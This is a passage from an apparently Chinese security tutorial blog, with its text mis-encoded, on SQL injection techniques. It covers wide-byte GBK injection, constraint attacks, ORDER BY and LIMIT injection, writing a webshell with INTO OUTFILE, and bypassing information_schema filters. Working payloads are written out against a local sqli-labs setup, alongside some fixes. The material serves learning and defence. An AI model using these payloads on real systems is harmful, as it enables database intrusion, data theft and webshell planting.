title="å¸¸è§æ€è·¯"></a>å¸¸è§æ€è·¯</h3><p>å¦‚æœæ˜¯å•å¼•å·é—­åˆ</p><p>æ³¨å†Œä¸€ä¸ª<code>admin&#39;#</code>è´¦æˆ·ï¼Œç™»å½•ä¿®æ”¹å…¶å¯†ç ï¼Œåˆ™å®é™…æ”¹çš„æ˜¯adminçš„å¯†ç </p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>å®½å­—èŠ‚å°±æ˜¯ä¸¤ä¸ªä»¥ä¸Šçš„å­—èŠ‚ï¼Œå®½å­—èŠ‚æ³¨å…¥äº§ç”Ÿçš„åŸå› å°±æ˜¯å„ç§å­—ç¬¦ç¼–ç çš„ä¸å½“æ“ä½œï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡å®½å­—èŠ‚ç¼–ç ç»•è¿‡SQLæ³¨å…¥é˜²å¾¡ã€‚</p><p>å®½å­—èŠ‚æ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸PHPç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚PHPçš„ç¼–ç ä¸ºUTF-8 è€ŒMySqlçš„ç¼–ç è®¾ç½®ä¸ºäº†SET NAMES â€˜gbkâ€™ æˆ–æ˜¯SET character_set_client &#x3D;gbkï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚</p><h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><ul><li><p><strong>addslashes()</strong> ï¼šè¿™ä¸ªå‡½æ•°åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ  \ ã€‚é¢„å®šä¹‰å­—ç¬¦ï¼š å•å¼•å· â€˜ ã€åŒå¼•å· â€ ã€åæ–œæ  \ ã€NULLã€‚ä½†æ˜¯è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯è™½ç„¶ä¼šæ·»åŠ åæ–œæ  \ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯ \ å¹¶ä¸ä¼šæ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚</p><blockquote><p>è¿™ä¸ªå‡½æ•°åŠŸèƒ½ä¸é­”æœ¯å¼•å·åŠŸèƒ½å®Œå…¨ç›¸åŒï¼Œå¦‚æœé­”æœ¯å¼•å·æ‰“å¼€å°±ä¸è¦ç”¨è¿™ä¸ªå‡½æ•°äº†</p></blockquote></li><li><p>ä¸‰ä¸ªé­”æœ¯å¼•å·åŠŸèƒ½</p><blockquote><ol><li><p>magic_quotes_gpc å½±å“åˆ° HTTP è¯·æ±‚æ•°æ®ï¼ˆGETï¼ŒPOST å’Œ COOKIEï¼‰ã€‚ä¸èƒ½åœ¨è¿è¡Œæ—¶æ”¹å˜ã€‚åœ¨ PHP ä¸­é»˜è®¤å€¼ä¸º onã€‚ å‚è§ get_magic_quotes_gpc()ã€‚å¦‚æœ magic_quotes_gpc å…³é—­æ—¶è¿”å› 0ï¼Œå¼€å¯æ—¶è¿”å› 1ã€‚åœ¨ PHP 5.4.0 èµ·å°†å§‹ç»ˆè¿”å› 0ï¼Œå› ä¸ºè¿™ä¸ªé­”æœ¯å¼•å·åŠŸèƒ½å·²ç»ä» PHP ä¸­ç§»é™¤äº†ã€‚</p></li><li><p>magic_quotes_runtime å¦‚æœæ‰“å¼€çš„è¯ï¼Œå¤§éƒ¨ä»½ä»å¤–éƒ¨æ¥æºå–å¾—æ•°æ®å¹¶è¿”å›çš„å‡½æ•°ï¼ŒåŒ…æ‹¬ä»æ•°æ®åº“å’Œæ–‡æœ¬æ–‡ä»¶ï¼Œæ‰€è¿”å›çš„æ•°æ®éƒ½ä¼šè¢«åæ–œçº¿è½¬ä¹‰ã€‚è¯¥é€‰é¡¹å¯åœ¨è¿è¡Œçš„æ—¶æ”¹å˜ï¼Œåœ¨ PHP ä¸­çš„é»˜è®¤å€¼ä¸º offã€‚ å‚è§ set_magic_quotes_runtime() å’Œ get_magic_quotes_runtime()ã€‚</p></li><li><p>magic_quotes_sybase (é­”æœ¯å¼•å·å¼€å…³)å¦‚æœæ‰“å¼€çš„è¯ï¼Œå°†ä¼šä½¿ç”¨å•å¼•å·å¯¹å•å¼•å·è¿›è¡Œè½¬ä¹‰è€Œéåæ–œçº¿ã€‚æ­¤é€‰é¡¹ä¼šå®Œå…¨è¦†ç›– magic_quotes_gpcã€‚å¦‚æœåŒæ—¶æ‰“å¼€ä¸¤ä¸ªé€‰é¡¹çš„è¯ï¼Œå•å¼•å·å°†ä¼šè¢«è½¬ä¹‰æˆ â€ã€‚è€ŒåŒå¼•å·ã€åæ–œçº¿ å’Œ NULL å­—ç¬¦å°†ä¸ä¼šè¿›è¡Œè½¬ä¹‰ã€‚</p></li></ol></blockquote></li></ul><h3 id="gbkç¼–ç "><a href="#gbkç¼–ç " class="headerlink" title="gbkç¼–ç "></a>gbkç¼–ç </h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åè¾“å…¥ï¼šadmin<span class="operator">%</span>df<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">è½¬ä¹‰åä¸ºï¼š admin%df\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"><span class="keyword">SET</span> character_set_client <span class="operator">=</span><span class="string">&#x27;gbk&#x27;</span>åï¼šadminé‹<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">æ‰§è¡Œè¯­å¥ï¼š... where username=&#x27;</span>adminé‹<span class="string">&#x27; or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>%df</code>åƒæ‰<code>\</code>çš„åŸå› æ˜¯ï¼Œ<code>urlencode(\&#39;)</code>&#x3D;<code>%5c%27</code> ,æ·»åŠ %dfåå½¢æˆ<code>%df%5c%27</code>,è€Œä¸Šé¢æåˆ°çš„mysql åœ¨GBK ç¼–ç æ–¹å¼çš„ï¼Œç¬¬ä¸€ä½èŒƒå›´ä¸º0x00-0x7Fæ—¶ï¼Œå½“ä½œä¸€ä¸ªå­—ç¬¦ã€‚%dfä¸åœ¨è¿™ä¸ªèŒƒå›´å†…ï¼Œå› æ­¤ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤æ—¶%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27(â€˜) åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„</p></blockquote><h3 id="utf8ç¼–ç ã€Latin1ç¼–ç "><a href="#utf8ç¼–ç ã€Latin1ç¼–ç " class="headerlink" title="utf8ç¼–ç ã€Latin1ç¼–ç "></a>utf8ç¼–ç ã€Latin1ç¼–ç </h3><p>UTF-8ç¼–ç æ˜¯å˜é•¿ç¼–ç ï¼Œå¯èƒ½æœ‰1~4ä¸ªå­—èŠ‚è¡¨ç¤ºï¼š </p><ul><li>ä¸€å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[00-7F] </code></li><li>ä¸¤å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[C0-DF][80-BF]</code> </li><li>ä¸‰å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[E0-EF][80-BF][80-BF]</code> </li><li>å››å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[F0-F7][80-BF][80-BF][80-BF]</code></li></ul><blockquote><p>ç„¶åæ ¹æ®RFC 3629è§„èŒƒï¼Œåˆæœ‰ä¸€äº›å­—èŠ‚å€¼æ˜¯ä¸å…è®¸å‡ºç°åœ¨UTF-8ç¼–ç ä¸­, æ‰€ä»¥æœ€ç»ˆï¼ŒUTF-8ç¬¬ä¸€å­—èŠ‚çš„å–å€¼èŒƒå›´æ˜¯ï¼š00-7Fã€C2-F4ã€‚</p></blockquote><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼š?username<span class="operator">=</span>admin<span class="operator">%</span>c2</span><br><span class="line"><span class="operator">%</span>c2æ˜¯Latin1å­—ç¬¦é›†ä¸å­˜åœ¨çš„å­—ç¬¦ï¼Œ<span class="operator">%</span><span class="number">00</span><span class="operator">-</span><span class="operator">%</span><span class="number">7</span>Få¯ä»¥ç›´æ¥è¡¨ç¤ºæŸä¸ªå­—ç¬¦ã€<span class="operator">%</span>C2<span class="operator">-</span><span class="operator">%</span>F4ä¸å¯ä»¥ç›´æ¥è¡¨ç¤ºæŸä¸ªå­—ç¬¦è€Œåªæ˜¯å…¶ä»–é•¿å­—èŠ‚ç¼–ç ç»“æœçš„é¦–å­—èŠ‚ã€‚å¯¹äºä¸å®Œæ•´çš„é•¿å­—èŠ‚UTF<span class="number">-8</span>ç¼–ç çš„å­—ç¬¦ï¼Œè¿›è¡Œå­—ç¬¦é›†è½¬æ¢æ—¶ä¼šç›´æ¥å¿½ç•¥ï¼Œæ‰€ä»¥admin<span class="operator">%</span>c2ä¼šå˜æˆadmin</span><br></pre></td></tr></table></figure></div><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><ul><li><p>åœ¨è°ƒç”¨ <strong>mysql_real_escape_string()</strong> å‡½æ•°ä¹‹å‰ï¼Œå…ˆè®¾ç½®è¿æ¥æ‰€ä½¿ç”¨çš„å­—ç¬¦é›†ä¸ºGBK ï¼Œ<strong>mysql_set_charset&#x3D;(â€˜gbkâ€™,$conn)</strong> ã€‚</p></li><li><p>æ‰€ä»¥é˜²æ­¢å®½å­—èŠ‚æ³¨å…¥çš„å¦ä¸€ä¸ªæ–¹æ³•å°±æ˜¯å°† <strong>character_set_client</strong> è®¾ç½®ä¸ºbinary(äºŒè¿›åˆ¶)ã€‚éœ€è¦åœ¨æ‰€æœ‰çš„sqlè¯­å¥å‰æŒ‡å®šè¿æ¥çš„å½¢å¼æ˜¯binaryäºŒè¿›åˆ¶ï¼š</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </span><br></pre></td></tr></table></figure></div><blockquote><p>å½“æˆ‘ä»¬çš„MySQLæ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚æ•°æ®åï¼Œä¼šè®¤ä¸ºä»–çš„ç¼–ç æ˜¯character_set_clientæ‰€å¯¹åº”çš„ç¼–ç ï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶ã€‚ç„¶åå†å°†å®ƒè½¬æ¢æˆcharacter_set_connectionæ‰€å¯¹åº”çš„ç¼–ç ã€‚ç„¶åè¿›å…¥å…·ä½“è¡¨å’Œå­—æ®µåï¼Œå†è½¬æ¢æˆå­—æ®µå¯¹åº”çš„ç¼–ç ã€‚å½“æŸ¥è¯¢ç»“æœäº§ç”Ÿåï¼Œä¼šä»è¡¨å’Œå­—æ®µçš„ç¼–ç è½¬æ¢æˆcharacter_set_resultsæ‰€å¯¹åº”çš„ç¼–ç ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å°†character_set_clientç¼–ç è®¾ç½®æˆäº†binaryï¼Œå°±ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥çš„é—®é¢˜äº†ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼ä¼ é€’ã€‚</p></blockquote></li></ul><h2 id="çº¦æŸæ”»å‡»"><a href="#çº¦æŸæ”»å‡»" class="headerlink" title="çº¦æŸæ”»å‡»"></a>çº¦æŸæ”»å‡»</h2><p>å½“æ•°æ®åº“å­—ç¬¦ä¸²é•¿åº¦è¿‡çŸ­ï¼Œå¹¶ä¸”åç«¯æ²¡æœ‰å¯¹å­—ç¬¦ä¸²è¿›è¡Œé•¿åº¦é™åˆ¶æ—¶</p><p>select è¯­å¥å¯¹äºå‚æ•°åé¢ç©ºæ ¼çš„å¤„ç†æ˜¯åˆ é™¤ï¼Œinsertåªæ˜¯æˆªå–æœ€å¤§é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ’å…¥æ•°æ®åº“ã€‚</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(</span><br><span class="line">username <span class="type">varchar</span>(<span class="number">25</span>),</span><br><span class="line">  password <span class="type">varchar</span>(<span class="number">25</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><p>æœ€å¤§é•¿åº¦é™åˆ¶(å…·ä½“çœ‹è¡¨çš„å®šä¹‰)ä¸º25 æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åä¸º admin[20ä¸ªç©ºæ ¼]1,å¯†ç éšæ„ã€‚è„šæœ¬æŸ¥è¯¢çš„æ—¶å€™å› ä¸ºç”¨äº†select è¯­å¥ï¼Œç©ºæ ¼è¢«åˆ é™¤ï¼Œå‰©ä¸‹äº†admin1ã€‚</p><p>æ³¨å†Œæ—¶ï¼šINSERTå–å‰25ä½-&gt;admin[20ä¸ªç©ºæ ¼]å’Œè‡ªå·±è®¾å®šçš„å¯†ç å½“æˆäº†ä¸€ä¸ªæ–°ç”¨æˆ·-&gt;selectæŸ¥æ‰¾adminï¼Œè¿”å›ä¸¤æ¡</p><blockquote><p>æ•°æ®åº“é‡Œé¢çš„ç©ºæ ¼ä¹Ÿåœ¨æŸ¥è¯¢çš„æ—¶å€™è¢«åˆ é™¤äº†å†æ¯”è¾ƒ</p></blockquote><h2 id="order-by-åçš„æ³¨å…¥"><a href="#order-by-åçš„æ³¨å…¥" class="headerlink" title="order by åçš„æ³¨å…¥"></a>order by åçš„æ³¨å…¥</h2><h3 id="order-byå‚æ•°åæ³¨å…¥"><a href="#order-byå‚æ•°åæ³¨å…¥" class="headerlink" title="order byå‚æ•°åæ³¨å…¥"></a>order byå‚æ•°åæ³¨å…¥</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];  </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure></div><p>sortå¯ä»¥æ˜¯sqlè¯­å¥ï¼Œåªè¦ä¿è¯è¿”å›ä¸€è¡Œä¸€åˆ—æˆ–è€…æ˜¯ä¸€ä¸ªæ•°å­—æˆ–å¸ƒå°”ç±»å‹ä¹Ÿå¯ä»¥,ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§</p><ul><li><p>ç›´æ¥æ³¨å…¥è¯­å¥ï¼ˆè¦è¿”å›å•è¡Œå•åˆ—ï¼‰ ?sort&#x3D;(select â€¦â€¦)</p></li><li><p>åˆ©ç”¨å‡½æ•°rand ?sort&#x3D;rand(sqlè¯­å¥)</p><ul><li>åˆ©ç”¨çš„æ˜¯rand(true)ä¸rand(false)å¯¼è‡´é¢˜ç›®å›æ˜¾ä¸åŒè€Œæ„é€ ç›²æ³¨æ¡ä»¶</li></ul><p>ä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)))</span><br></pre></td></tr></table></figure></div></li><li><p>åˆ©ç”¨and ?sort&#x3D;1 and(sqlè¯­å¥)</p><ul><li>è¿™é‡Œçš„sqlè¯­å¥å¯ä»¥ç”¨å»¶æ—¶æ³¨å…¥</li></ul><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>,<span class="number">0</span>,sleep(<span class="number">5</span>))</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="procedure-analyse-å‚æ•°åæ³¨å…¥"><a href="#procedure-analyse-å‚æ•°åæ³¨å…¥" class="headerlink" title="procedure analyse å‚æ•°åæ³¨å…¥"></a>procedure analyse å‚æ•°åæ³¨å…¥</h3><p>æ­¤æ–¹æ³•é€‚ç”¨äºMySQL 5.xä¸­ï¼Œåœ¨limitè¯­å¥åé¢çš„æ³¨å…¥ åˆ©ç”¨procedure analyse å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><p>åŒæ—¶ï¼Œåœ¨procedure analyse å’Œorder by ä¹‹é—´å¯ä»¥å­˜åœ¨limit å‚æ•°ï¼Œæˆ‘ä»¬åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¾€å¾€ä¹Ÿå¯èƒ½ä¼šå­˜åœ¨limit åçš„æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨procedure analyse è¿›è¡Œæ³¨å…¥</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-46</span><span class="operator">/</span>?sort<span class="operator">=</span><span class="number">1</span>  <span class="keyword">procedure</span> analyse(extractvalue(rand(),con</span><br><span class="line">cat(<span class="number">0x3a</span>,version())),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>); </span><br><span class="line"># å¦‚æœä¸æ”¯æŒæŠ¥é”™æ³¨å…¥çš„è¯ï¼Œè¿˜å¯ä»¥åŸºäºæ—¶é—´æ³¨å…¥ï¼š</span><br><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><h3 id="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into-outfile-å‚æ•°"><a href="#å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into-outfile-å‚æ•°" class="headerlink" title="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°"></a>å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-46</span><span class="operator">/</span>?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile &quot;c:\\wamp\\www\\sqllib\\test</span><br><span class="line">1.txt&quot;</span><br><span class="line"># å°†æŸ¥è¯¢ç»“æœå¯¼å…¥åˆ°æ–‡ä»¶å½“ä¸­</span><br><span class="line"># é‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¸Šä¼ ç½‘é©¬ï¼Œåˆ©ç”¨lines terminated <span class="keyword">by</span></span><br><span class="line"><span class="keyword">Into</span> outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated <span class="keyword">by</span> <span class="number">0</span>x(ç½‘é©¬è¿›è¡Œ<span class="number">16</span> è¿›åˆ¶è½¬</span><br><span class="line">æ¢)</span><br></pre></td></tr></table></figure></div><h2 id="å…­ã€å¸¸è§bypass"><a href="#å…­ã€å¸¸è§bypass" class="headerlink" title="å…­ã€å¸¸è§bypass"></a>å…­ã€å¸¸è§bypass</h2><p><a class="link"   href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" >SQLæ³¨å…¥ç»•è¿‡æŠ€å·§ | ç“¦éƒ½å‰‹ (dropsec.xyz) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Information-schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶"><a href="#Information-schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶" class="headerlink" title="Information_schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶"></a>Information_schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶</h3><p><a class="link"   href="https://www.anquanke.com/post/id/193512" >èŠä¸€èŠbypass information_schema - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="MySQL5-7çš„æ–°ç‰¹æ€§"><a href="#MySQL5-7çš„æ–°ç‰¹æ€§" class="headerlink" title="MySQL5.7çš„æ–°ç‰¹æ€§"></a>MySQL5.7çš„æ–°ç‰¹æ€§</h4><blockquote><p>ç”±äºperformance_schemaè¿‡äºå‘æ‚ï¼Œæ‰€ä»¥mysqlåœ¨5.7ç‰ˆæœ¬ä¸­æ–°å¢äº†sys schemmaï¼ŒåŸºç¡€æ•°æ®æ¥è‡ªäºperformance_chemaå’Œinformation_schemaä¸¤ä¸ªåº“ï¼Œæœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®ã€‚</p></blockquote><h4 id="innodbè¡¨â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨"><a href="#innodbè¡¨â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨" class="headerlink" title="innodbè¡¨â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨"></a><strong>innodbè¡¨</strong>â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨</h4><p>MySQL 5.6 åŠä»¥ä¸Šç‰ˆæœ¬å­˜åœ¨innodb_index_statsï¼Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œå…¶ä¸­åŒ…å«æ–°å»ºç«‹çš„åº“å’Œè¡¨</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name <span class="operator">=</span> database(); # è¿”å›å»é‡è¿‡åçš„è¡¨å(ç®€æ´)</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_index_stats <span class="keyword">where</span> database_name <span class="operator">=</span> database(); # è¿”å›å€¼ä¸­ä¼šå‡ºç°é‡å¤çš„è¡¨å</span><br></pre></td></tr></table></figure></div><h4 id="sysè¡¨"><a href="#sysè¡¨" class="headerlink" title="sysè¡¨"></a>sysè¡¨</h4><p>åœ¨MySQL 5.7.9ä¸­sysä¸­æ–°å¢äº†ä¸€äº›è§†å›¾ï¼Œå¯ä»¥ä»ä¸­è·å–è¡¨å</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#åŒ…å«<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="keyword">where</span> object_schema <span class="operator">=</span> database();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line">#ä¸åŒ…å«<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line">#é€šè¿‡è¡¨æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„è·å–è¡¨å</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"></span><br><span class="line">#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨ï¼ˆè‹¥æ— 